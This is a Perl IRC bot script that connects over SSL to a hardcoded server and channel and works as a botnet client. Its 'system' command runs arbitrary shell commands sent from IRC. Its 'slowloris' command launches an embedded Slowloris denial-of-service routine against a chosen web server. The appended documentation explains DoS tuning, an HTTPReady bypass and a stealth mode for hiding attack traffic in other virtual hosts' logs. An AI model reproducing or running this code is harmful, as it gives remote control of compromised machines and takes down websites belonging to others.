#!/usr/local/ActivePerl-5.10/bin/perl
use strict;
use warnings;
use POE qw(Component::IRC);
use LWP::Simple;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;
use POE::Component::SSLify;

my $nickname = 'PoeIrcBot' . $$;
my $ircname = 'POEIRCBOT';
my $server = '69.164.199.9';
my $port = '6900';
my $channel = "#hammer";
my $password = "password";

my @channels = ('');


# We create a new PoCo-IRC object
my $irc = POE::Component::IRC->spawn( 
   nick => $nickname,
   ircname => $ircname,
   server => $server,
   port => $port,
   UseSSL => 1,
   
) or die "Oh noooo! $!";

POE::Session->create(
    package_states => [
        main => [ qw(_default _start irc_001 irc_public) ],
    ],
    heap => { irc => $irc },
);

$poe_kernel->run();

sub _start {
    my $heap = $_[HEAP];

    # retrieve our component's object from the heap where we stashed it
    my $irc = $heap->{irc};

    $irc->yield( register => 'all' );
    $irc->yield( connect => { } );
    return;
}

sub irc_001 {
    my $sender = $_[SENDER];

    # Since this is an irc_* event, we can get the component's object by
    # accessing the heap of the sender. Then we register and connect to the
    # specified server.
    my $irc = $sender->get_heap();

    print "Connected to ", $irc->server_name(), "\n";

    # we join our channels
    $irc->yield( join => $_ ) for @channels;
    $irc->yield( join => "$channel $password");
    return;
}

sub irc_public {
    my ($sender, $who, $where, $what) = @_[SENDER, ARG0 .. ARG2];
    my $nick = ( split /!/, $who )[0];
    my $channel = $where->[0];

    if ( my ($loadWord) = $what =~ /^load/ ) {
     my $uptime = `uptime`;
        my $cpuUsagetwo = qr/(load averages: \d+\.\d+ \d+\.\d+ \d+\.\d+)/;
        if ($uptime =~ $cpuUsagetwo){
         $irc->yield( privmsg => $channel => "$nick: $&" );
        }
    }
        if ( my ($ipWord) = $what =~ /^ipadd/ ) {
      my @ifconfig = `ifconfig`;
         my $inetter = qr/(inet \d+\.\d+\.\d+.\d+)/;
         foreach (@ifconfig) {
         my $line = $_;
         if ($line =~ $inetter){
          $irc->yield( privmsg => $channel => "$nick: $&" );
         }
        }
    }

        if ( my ($ipWordtwp) = $what =~ /^exadd/ ) {
                  my $whyip = qr/(Your IP address is \d+\.\d+\.\d+.\d+)/;
      my $content = get("http://whatismyipaddress.com");
      if($content =~ $whyip){
       $irc->yield( privmsg => $channel => "$nick: $&" );
     }
    }
    if ( my ($sysWord) = $what =~ /^system/ ) {
      my @sysCmd = `$'`;
         foreach(@sysCmd){
          $irc->yield( privmsg => $channel => "$nick: $_" );
         }
      }
      if ( my ($sysWord) = $what =~ /^slowloris/ ) {
        my $dnspick = $';
        my $timeoutpick = '240';
        $SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors
  
  
  my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
  my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
  my $result = GetOptions(
      'shost=s'   => \$shost,
      'dns=s'     => \$host,
      'httpready' => \$httpready,
      'num=i'     => \$connections,
      'cache'     => \$cache,
      'port=i'    => \$port,
      'https'     => \$ssl,
      'tcpto=i'   => \$tcpto,
      'test'      => \$test,
      'timeout=i' => \$timeout,
      'version'   => \$version,
  );
  
  if ($version) {
      print "Version 0.7\n";
      exit;
  }
  
  unless ($dnspick) {
      print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
      print "\n\tType 'perldoc $0' for help with options.\n\n";
      exit;
  }
  
  unless ($port) {
      $port = 80;
      print "Defaulting to port 80.\n";
  }
  
  unless ($tcpto) {
      $tcpto = 5;
      print "Defaulting to a 5 second tcp connection timeout.\n";
  }
  
  unless ($test) {
      unless ($timeout) {
          $timeout = 240;
          print "Defaulting to a 100 second re-try timeout.\n";
      }
      unless ($connections) {
          $connections = 1000;
          print "Defaulting to 1000 connections.\n";
      }
  }
  
  my $usemultithreading = 0;
  if ( $Config{usethreads} ) {
      print "Multithreading enabled.\n";
      $usemultithreading = 1;
      use threads;
      use threads::shared;
  }
  else {
      print "No multithreading capabilites found!\n";
      print "Slowloris will be slower than normal as a result.\n";
  }
  
  my $packetcount : shared     = 0;
  my $failed : shared          = 0;
  my $connectioncount : shared = 0;
  
  srand() if ($cache);
  
  if ($shost) {
      $sendhost = $shost;
  }
  else {
      $sendhost = $dnspick;
  }
  if ($httpready) {
      $method = "POST";
  }
  else {
      $method = "GET";
  }
  
  if ($test) {
      my @times = ( "2", "30", "90", "240", "500" );
      my $totaltime = 0;
      foreach (@times) {
          $totaltime = $totaltime + $_;
      }
      $totaltime = $totaltime / 60;
      print "This test could take up to $totaltime minutes.\n";
  
      my $delay   = 0;
      my $working = 0;
      my $sock;
  
      if ($ssl) {
          if (
              $sock = new IO::Socket::SSL(
                  PeerAddr => "$dnspick",
                  PeerPort => "$port",
                  Timeout  => "$tcpto",
                  Proto    => "tcp",
              )
            )
          {
              $working = 1;
          }
      }
      else {
          if (
              $sock = new IO::Socket::INET(
                  PeerAddr => "$dnspick",
                  PeerPort => "$port",
                  Timeout  => "$tcpto",
                  Proto    => "tcp",
              )
            )
          {
              $working = 1;
          }
      }
      if ($working) {
          if ($cache) {
              $rand = "?" . int( rand(99999999999999) );
          }
          else {
              $rand = "";
          }
          my $primarypayload =
              "GET /$rand HTTP/1.1\r\n"
            . "Host: $sendhost\r\n"
            . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
            . "Content-Length: 42\r\n";
          if ( print $sock $primarypayload ) {
              print "Connection successful, now comes the waiting game...\n";
          }
          else {
              print
  "That's odd - I connected but couldn't send the data to $dnspick:$port.\n";
              print "Is something wrong?\nDying.\n";
              exit;
          }
      }
      else {
          print "Uhm... I can't connect to $dnspick:$port.\n";
          print "Is something wrong?\nDying.\n";
          exit;
      }
      for ( my $i = 0 ; $i <= $#times ; $i++ ) {
          print "Trying a $times[$i] second delay: \n";
          sleep( $times[$i] );
          if ( print $sock "X-a: b\r\n" ) {
              print "\tWorked.\n";
              $delay = $times[$i];
          }
          else {
              if ( $SIG{__WARN__} ) {
                  $delay = $times[ $i - 1 ];
                  last;
              }
              print "\tFailed after $times[$i] seconds.\n";
          }
      }
  
      if ( print $sock "Connection: Close\r\n\r\n" ) {
          print "Okay that's enough time. Slowloris closed the socket.\n";
          print "Use $delay seconds for -timeout.\n";
          exit;
      }
      else {
          print "Remote server closed socket.\n";
          print "Use $delay seconds for -timeout.\n";
          exit;
      }
      if ( $delay < 166 ) {
 
      }
  }
  else {
      print
  "Connecting to $dnspick:$port every $timeout seconds with $connections sockets:\n";
  
      if ($usemultithreading) {
          domultithreading($connections);
      }
      else {
          doconnections( $connections, $usemultithreading );
      }
  }
  
  sub doconnections {
      my ( $num, $usemultithreading ) = @_;
      my ( @first, @sock, @working );
      my $failedconnections = 0;
      $working[$_] = 0 foreach ( 1 .. $num );    #initializing
      $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
      while (1) {
          $failedconnections = 0;
          print "\t\tBuilding sockets.\n";
          foreach my $z ( 1 .. $num ) {
              if ( $working[$z] == 0 ) {
                  if ($ssl) {
                      if (
                          $sock[$z] = new IO::Socket::SSL(
                              PeerAddr => "$dnspick",
                              PeerPort => "$port",
                              Timeout  => "$tcpto",
                              Proto    => "tcp",
                          )
                        )
                      {
                          $working[$z] = 1;
                      }
                      else {
                          $working[$z] = 0;
                      }
                  }
                  else {
                      if (
                          $sock[$z] = new IO::Socket::INET(
                              PeerAddr => "$dnspick",
                              PeerPort => "$port",
                              Timeout  => "$tcpto",
                              Proto    => "tcp",
                          )
                        )
                      {
                          $working[$z] = 1;
                          $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                      }
                      else {
                          $working[$z] = 0;
                      }
                  }
                  if ( $working[$z] == 1 ) {
                      if ($cache) {
                          $rand = "?" . int( rand(99999999999999) );
                      }
                      else {
                          $rand = "";
                      }
                      my $primarypayload =
                          "$method /$rand HTTP/1.1\r\n"
                        . "Host: $sendhost\r\n"
                        . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                        . "Content-Length: 42\r\n";
                      my $handle = $sock[$z];
                      if ($handle) {
                          print $handle "$primarypayload";
                          if ( $SIG{__WARN__} ) {
                              $working[$z] = 0;
                              close $handle;
                              $failed++;
                              $failedconnections++;
                          }
                          else {
                              $packetcount++;
                              $working[$z] = 1;
                          }
                      }
                      else {
                          $working[$z] = 0;
                          $failed++;
                          $failedconnections++;
                      }
                  }
                  else {
                      $working[$z] = 0;
                      $failed++;
                      $failedconnections++;
                  }
              }
          }
          print "\t\tSending data.\n";
          foreach my $z ( 1 .. $num ) {
              if ( $working[$z] == 1 ) {
                  if ( $sock[$z] ) {
                      my $handle = $sock[$z];
                      if ( print $handle "X-a: b\r\n" ) {
                          $working[$z] = 1;
                          $packetcount++;
                      }
                      else {
                          $working[$z] = 0;
                          #debugging info
                          $failed++;
                          $failedconnections++;
                      }
                  }
                  else {
                      $working[$z] = 0;
                      #debugging info
                      $failed++;
                      $failedconnections++;
                  }
              }
          }
          print
  "Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
          sleep($timeout);
      }
  }
  
  sub domultithreading {
      my ($num) = @_;
      my @thrs;
      my $i                    = 0;
      my $connectionsperthread = 50;
      while ( $i < $num ) {
          $thrs[$i] =
            threads->create( \&doconnections, $connectionsperthread, 1 );
          $i += $connectionsperthread;
      }
      my @threadslist = threads->list();
      while ( $#threadslist > 0 ) {
          $failed = 0;
      }
  }
  
        }

      
    return;
}


# We registered for all events, this will produce some debug info.
sub _default {
    my ($event, $args) = @_[ARG0 .. $#_];
    my @output = ( "$event: " );

    for my $arg (@$args) {
        if ( ref $arg eq 'ARRAY' ) {
            push( @output, '[' . join(', ', @$arg ) . ']' );
        }
        else {
            push ( @output, "'$arg'" );
        }
    }
    print join ' ', @output, "\n";
    return 0;
}

__END__
  
  =head1 TITLE
  
  Slowloris
  
  =head1 VERSION
  
  Version 0.7 Beta
  
  =head1 DATE
  
  06/17/2009
  
  =head1 AUTHOR
  
  RSnake  with threading from John Kinsella
  
  =head1 ABSTRACT
  
  Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.
  
  =head1 AFFECTS
  
  Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, Squid, others...?
  
  =head1 NOT AFFECTED
  
  IIS6.0, IIS7.0, lighthttpd, others...?
  
  =head1 DESCRIPTION
  
  Slowloris is designed so that a single machine (probably a Linux/UNIX machine since Windows appears to limit how many sockets you can have open at any given time) can easily tie up a typical web server or proxy server by locking up all of it's threads as they patiently wait for more data.  Some servers may have a smaller tolerance for timeouts than others, but Slowloris can compensate for that by customizing the timeouts.  There is an added function to help you get started with finding the right sized timeouts as well.
  
  As a side note, Slowloris does not consume a lot of resources so modern operating systems don't have a need to start shutting down sockets when they come under attack, which actually in turn makes Slowloris better than a typical flooder in certain circumstances.  Think of Slowloris as the HTTP equivalent of a SYN flood.
  
  =head2 Testing
  
  If the timeouts are completely unknown, Slowloris comes with a mode to help you get started in your testing:
  
  =head3 Testing Example:
  
  ./slowloris.pl -dns www.example.com -port 80 -test
  
  This won't give you a perfect number, but it should give you a pretty good guess as to where to shoot for.  If you really must know the exact number, you may want to mess with the @times array (although I wouldn't suggest that unless you know what you're doing).
  
  =head2 HTTP DoS
  
  Once you find a timeout window, you can tune Slowloris to use certain timeout windows.  For instance, if you know that the server has a timeout of 3000 seconds, but the the connection is fairly latent you may want to make the timeout window 2000 seconds and increase the TCP timeout to 5 seconds.  The following example uses 500 sockets.  Most average Apache servers, for instance, tend to fall down between 400-600 sockets with a default configuration.  Some are less than 300.  The smaller the timeout the faster you will consume all the available resources as other sockets that are in use become available - this would be solved by threading, but that's for a future revision.  The closer you can get to the exact number of sockets, the better, because that will reduce the amount of tries (and associated bandwidth) that Slowloris will make to be successful.  Slowloris has no way to identify if it's successful or not though.
  
  =head3 HTTP DoS Example:
  
  ./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5
  
  =head2 HTTPReady Bypass
  
  HTTPReady only follows certain rules so with a switch Slowloris can bypass HTTPReady by sending the attack as a POST verses a GET or HEAD request with the -httpready switch. 
  
  =head3 HTTPReady Bypass Example
  
  ./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready
  
  =head2 Stealth Host DoS
  
  If you know the server has multiple webservers running on it in virtual hosts, you can send the attack to a seperate virtual host using the -shost variable.  This way the logs that are created will go to a different virtual host log file, but only if they are kept separately.
  
  =head3 Stealth Host DoS Example:
  
  ./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com
  
  =head2 HTTPS DoS
  
  Slowloris does support SSL/TLS on an experimental basis with the -https switch.  The usefulness of this particular option has not been thoroughly tested, and in fact has not proved to be particularly effective in the very few tests I performed during the early phases of development.  Your mileage may vary.
  
  =head3 HTTPS DoS Example:
  
  ./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https
  
  =head2 HTTP Cache
  
  Slowloris does support cache avoidance on an experimental basis with the -cache switch.  Some caching servers may look at the request path part of the header, but by sending different requests each time you can abuse more resources.  The usefulness of this particular option has not been thoroughly tested.  Your mileage may vary.
  
  =head3 HTTP Cache Example:
  
  ./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache
  
  =head1 Issues
  
  Slowloris is known to not work on several servers found in the NOT AFFECTED section above and through Netscalar devices, in it's current incarnation.  They may be ways around this, but not in this version at this time.  Most likely most anti-DDoS and load balancers won't be thwarted by Slowloris, unless Slowloris is extremely distrubted, although only Netscalar has been tested. 
  
  Slowloris isn't completely quiet either, because it can't be.  Firstly, it does send out quite a few packets (although far far less than a typical GET request flooder).  So it's not invisible if the traffic to the site is typically fairly low.  On higher traffic sites it will unlikely that it is noticed in the log files - although you may have trouble taking down a larger site with just one machine, depending on their architecture.
  
  For some reason Slowloris works way better if run from a *Nix box than from Windows.  I would guess that it's probably to do with the fact that Windows limits the amount of open sockets you can have at once to a fairly small number.  If you find that you can't open any more ports than ~130 or so on any server you test - you're probably running into this "feature" of modern operating systems.  Either way, this program seems to work best if run from FreeBSD.  
  
  Once you stop the DoS all the sockets will naturally close with a flurry of RST and FIN packets, at which time the web server or proxy server will write to it's logs with a lot of 400 (Bad Request) errors.  So while the sockets remain open, you won't be in the logs, but once the sockets close you'll have quite a few entries all lined up next to one another.  You will probably be easy to find if anyone is looking at their logs at that point - although the DoS will be over by that point too.
  
  =head1 What is a slow loris?
  
  What exactly is a slow loris?  It's an extremely cute but endangered mammal that happens to also be poisonous.  Check this out:
  
  http://www.youtube.com/watch?v=rLdQ3UhLoD4
  
  # milw0rm.com [2009-06-17]